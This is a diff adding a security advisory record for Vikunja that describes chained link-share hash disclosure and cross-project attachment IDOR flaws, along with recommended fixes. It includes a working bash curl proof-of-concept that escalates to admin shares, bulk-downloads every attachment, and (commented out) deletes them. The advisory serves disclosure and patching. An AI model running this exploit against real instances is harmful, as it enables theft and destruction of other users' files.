@@ -1,0 +1,58 @@
+{
+  "id": "GHSA-2pv8-4c52-mf8j",
+  "modified": "2026-03-26T21:11:31.843952Z",
+  "published": "2026-03-26T16:56:24Z",
+  "aliases": [
+    "GO-2026-4855"
+  ],
+  "summary": "Vikunja: Unauthenticated Instance-Wide Data Breach via Link Share Hash Disclosure Chained with Cross-Project Attachment IDOR",
+  "details": "## Summary\n\nTwo independently-exploitable authorization flaws in Vikunja can be chained to allow an unauthenticated attacker to download and delete every file attachment across all projects in a Vikunja instance. The `ReadAll` endpoint for link shares exposes share hashes (including admin-level shares) to any user with read access, enabling permission escalation. The task attachment `ReadOne`/`GetTaskAttachment` endpoint performs permission checks against a user-supplied task ID but fetches the attachment by its own sequential ID without verifying the attachment belongs to that task, enabling cross-project file access.\n\n## Details\n\n### Vulnerability 1: Link Share Hash Disclosure (Permission Escalation Entry Point)\n\nTracked in https://github.com/go-vikunja/vikunja/security/advisories/GHSA-8hp8-9fhr-pfm9\n\nThe `LinkSharing.ReadAll()` method in `pkg/models/link_sharing.go:228-287` returns all link shares for a project, including the `Hash` field:\n\n```go\n// pkg/models/link_sharing.go:46-50\ntype LinkSharing struct {\n    ID   int64  `xorm:\"bigint autoincr not null unique pk\" json:\"id\" param:\"share\"`\n    Hash string `xorm:\"varchar(40) not null unique\" json:\"hash\" param:\"hash\"`  // ← exposed in JSON\n    // ...\n}\n```\n\nThe ReadAll clears passwords but not hashes:\n```go\n// pkg/models/link_sharing.go:272-277\nfor _, s := range shares {\n    if sharedBy, has := users[s.SharedByID]; has {\n        s.SharedBy = sharedBy\n    }\n    s.Password = \"\"  // ← password cleared, but hash remains\n}\n```\n\nA link share user with read-only access can call `GET /api/v1/projects/:project/shares` (routed at `pkg/routes/routes.go:483`) to discover all shares, then authenticate with an admin-level share hash.\n\n### Vulnerability 2: Cross-Project Attachment IDOR (Data Exfiltration)\n\nTracked in https://github.com/go-vikunja/vikunja/security/advisories/GHSA-jfmm-mjcp-8wq2\n\nThe `GetTaskAttachment` handler in `pkg/routes/api/v1/task_attachment.go:156-186` performs the permission check against the task ID supplied in the URL:\n\n```go\n// pkg/models/task_attachment_permissions.go:25-28\nfunc (ta *TaskAttachment) CanRead(s *xorm.Session, a web.Auth) (bool, int, error) {\n    t := \u0026Task{ID: ta.TaskID}  // ← ta.TaskID from URL parameter\n    return t.CanRead(s, a)     // ← checks if user can read THIS task\n}\n```\n\nBut `ReadOne` fetches the attachment by its own ID, ignoring the task:\n\n```go\n// pkg/models/task_attachment.go:110-111\nfunc (ta *TaskAttachment) ReadOne(s *xorm.Session, _ web.Auth) (err error) {\n    exists, err := s.Where(\"id = ?\", ta.ID).Get(ta)  // ← fetches by attachment ID only\n    // ta.TaskID is now overwritten with the ACTUAL task ID from the database\n    // But the permission check already passed using the attacker-controlled task ID\n```\n\nThis means: specify a task you CAN access, but an attachment ID from a different project → permission check passes, wrong attachment is returned.\n\n### The Chain\n\n```\nLink share URL (public)\n    → POST /shares/{hash}/auth (get JWT)\n    → GET /projects/{id}/shares (discover admin share hash)\n    → POST /shares/{admin_hash}/auth (escalate to admin)\n    → GET /projects/{id}/tasks (find any accessible task ID)\n    → GET /tasks/{accessible_task}/attachments/{1..N} (enumerate ALL attachments)\n    → DELETE /tasks/{accessible_task}/attachments/{1..N} (destroy ALL attachments)\n```\n\n## PoC\n\n**Prerequisites:** A Vikunja instance with at least one link share (any permission level). The attacker only needs the link share URL.\n\n```bash\nVIKUNJA=\"http://localhost:3456/api/v1\"\n\n# Step 1: Authenticate with a known read-only link share hash\n# (Link share URLs look like: https://instance/share/HASH_HERE)\nSHARE_HASH=\"read-only-share-hash\"\n\nTOKEN=$(curl -s -X POST \"$VIKUNJA/shares/$SHARE_HASH/auth\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{}' | jq -r '.token')\n\necho \"Got JWT: $TOKEN\"\n\n# Step 2: Discover all link shares for the project (including admin shares)\nPROJECT_ID=1  # from the link share JWT claims\n\nSHARES=$(curl -s \"$VIKUNJA/projects/$PROJECT_ID/shares\" \\\n  -H \"Authorization: Bearer $TOKEN\")\n\necho \"All shares exposed:\"\necho \"$SHARES\" | jq '.[].hash'  # All hashes visible, including admin shares\n\n# Step 3: Escalate to admin if available\nADMIN_HASH=$(echo \"$SHARES\" | jq -r '.[] | select(.permission == 2) | .hash' | head -1)\n\nif [ -n \"$ADMIN_HASH\" ]; then\n  TOKEN=$(curl -s -X POST \"$VIKUNJA/shares/$ADMIN_HASH/auth\" \\\n    -H \"Content-Type: application/json\" \\\n    -d '{}' | jq -r '.token')\n  echo \"Escalated to admin share: $ADMIN_HASH\"\nfi\n\n# Step 4: Get a task ID we can legitimately access\nTASK_ID=$(curl -s \"$VIKUNJA/projects/$PROJECT_ID/tasks\" \\\n  -H \"Authorization: Bearer $TOKEN\" | jq '.[0].id')\n\necho \"Using accessible task: $TASK_ID\"\n\n# Step 5: Exploit attachment IDOR - enumerate ALL attachments across ALL projects\nfor ATTACHMENT_ID in $(seq 1 100); do\n  RESP=$(curl -s -o /tmp/attachment_$ATTACHMENT_ID -w \"%{http_code}\" \\\n    \"$VIKUNJA/tasks/$TASK_ID/attachments/$ATTACHMENT_ID\" \\\n    -H \"Authorization: Bearer $TOKEN\")\n\n  if [ \"$RESP\" = \"200\" ]; then\n    echo \"Downloaded attachment $ATTACHMENT_ID (from ANY project): /tmp/attachment_$ATTACHMENT_ID\"\n  fi\ndone\n\n# Step 6 (destructive, with admin share): Delete attachments from other projects\n# curl -s -X DELETE \"$VIKUNJA/tasks/$TASK_ID/attachments/$TARGET_ATTACHMENT_ID\" \\\n#   -H \"Authorization: Bearer $TOKEN\"\n```\n\n## Impact\n\n**Confidentiality (HIGH):** An attacker with a single publicly-shared link share URL can download every file attachment across all projects in the Vikunja instance. Attachment IDs are sequential integers, making enumeration trivial. This includes confidential documents, images, and any files uploaded by any user in any project.\n\n**Integrity (HIGH):** With the permission escalation from read-only to admin (via hash disclosure), the attacker can delete attachments from any project, causing data loss across the entire instance.\n\n**Attack prerequisites are minimal:** Link shares are designed to be publicly shared — they're the mechanism for sharing projects with external collaborators. A single leaked or intentionally-shared link share URL (even read-only) is sufficient to compromise all file attachments instance-wide.\n\n**Blast radius:** Every project, every task, every file attachment on the instance is exposed regardless of project membership, team boundaries, or access controls.\n\n## Recommended Fix\n\n**Fix 1 — Link Share Hash Disclosure:** Clear the hash field in ReadAll responses:\n\n```go\n// pkg/models/link_sharing.go — in ReadAll loop (~line 272)\nfor _, s := range shares {\n    if sharedBy, has := users[s.SharedByID]; has {\n        s.SharedBy = sharedBy\n    }\n    s.Password = \"\"\n    s.Hash = \"\"  // ← ADD THIS: never expose hashes to other share holders\n}\n```\n\n**Fix 2 — Attachment IDOR:** Verify the attachment belongs to the specified task in both ReadOne and the download handler:\n\n```go\n// pkg/models/task_attachment.go — ReadOne\nfunc (ta *TaskAttachment) ReadOne(s *xorm.Session, _ web.Auth) (err error) {\n    exists, err := s.Where(\"id = ? AND task_id = ?\", ta.ID, ta.TaskID).Get(ta)\n    //                                ^^^^^^^^^^^^^^ ADD: verify task ownership\n    if err != nil {\n        return\n    }\n    // ...\n}\n```\n\nBoth fixes should be applied — the attachment IDOR is exploitable independently by any authenticated user, and the link share hash disclosure enables permission escalation even without the attachment bug.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "code.vikunja.io/api",
+        "purl": "pkg:golang/code.vikunja.io/api"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.2.1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 2.2.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-2pv8-4c52-mf8j/GHSA-2pv8-4c52-mf8j.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/security/advisories/GHSA-2pv8-4c52-mf8j"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/security/advisories/GHSA-8hp8-9fhr-pfm9"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/security/advisories/GHSA-jfmm-mjcp-8wq2"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/go-vikunja/vikunja"
+    },
+    {
+      "type": "WEB",
+      "url": "https://vikunja.io/changelog/vikunja-v2.2.2-was-released"
+    }
+  ]
+}
